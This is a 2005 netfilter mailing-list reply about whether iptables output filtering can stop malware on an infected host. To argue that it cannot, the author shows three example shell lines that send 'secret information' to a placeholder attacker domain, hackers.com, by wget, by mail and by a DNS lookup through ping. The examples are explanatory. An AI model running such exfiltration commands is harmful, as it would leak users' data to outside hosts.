From: Frank Gruellich <frank@der-frank.org>
Subject: Re: Nice ZoneAlarm that might be useful for Iptables
Date: Tue, 31 May 2005 06:33:10 +0200
Message-ID: <20050531043310.GF3681@der-frank.org>
References: <429BDF9F.7070707@mindspring.com>
Mime-Version: 1.0
Return-path: <netfilter-bounces@lists.netfilter.org>
Content-Disposition: inline
In-Reply-To: <429BDF9F.7070707@mindspring.com>
List-Id: <netfilter.vger.kernel.org>
List-Unsubscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=unsubscribe>
List-Archive: </pipermail/netfilter>
List-Post: <mailto:netfilter@lists.netfilter.org>
List-Help: <mailto:netfilter-request@lists.netfilter.org?subject=help>
List-Subscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=subscribe>
Sender: netfilter-bounces@lists.netfilter.org
Errors-To: netfilter-bounces@lists.netfilter.org
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: netfilter@lists.netfilter.org

Hi,

* Larry Alkoff <labradley@mindspring.com> 30. May 05:
> [Zonealarm]
> In addition, it will warn if a program is asking for server rights 
> although and ask for approval to grant that, although I don't understand 
> what they mean by "server rights".

AFAIK Zonealarm it means, that a program starts a server: it listens on
a port.  For Unix it needs root priveleges to listen on ports below 1024
(dunno about Windows).

> Most Iptables scripts I've seen do very little OUTPUT filtering which 
> means a malicious program, if it got access somehow, could have free 
> range to send packets out.  Zombie or spyware perhaps.

While OUTPUT has nothing to do with servers, it is simply impossible.
You can't protect an infected host.

> The ability to block this by only allowing "approved" programs to access 
> the Internet would be a nice addition to Iptables.

Define "access the Internet".  There will be some hundreds of ways for
malware to send data you can't even catch with iptables.  There are some
more dozens of ways you can't block at all.  How do you intend to catch

 $ wget 'http://www.hackers.com/script.php?info=this%20is%20my%20very%20secret%20information'
 $ echo "this is the very secret information" |mail -s "$USER@`hostname -f`" jr@hackers.com
 $ ping -c1 www.this.is.my.very.secret.information.hackers.com

and many other things?  Don't install software you don't trust.  Sorry,
but this is AFAICS the only way.

Kind regards,
 Frank.
-- 
Sigmentation fault

